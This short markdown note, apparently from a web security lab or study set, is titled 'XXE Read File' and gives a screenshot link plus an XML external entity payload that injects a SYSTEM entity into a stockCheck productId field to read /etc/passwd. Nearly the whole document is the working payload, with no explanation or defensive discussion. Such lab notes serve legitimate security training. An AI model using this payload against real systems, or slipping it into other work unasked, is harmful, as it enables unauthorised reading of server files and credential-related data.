# XXE Read File 

### check which tag to show file content
<img width="1190" height="470" alt="image" src="https://github.com/user-attachments/assets/0e641009-dce1-4366-99de-87f7aa83516b" />

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
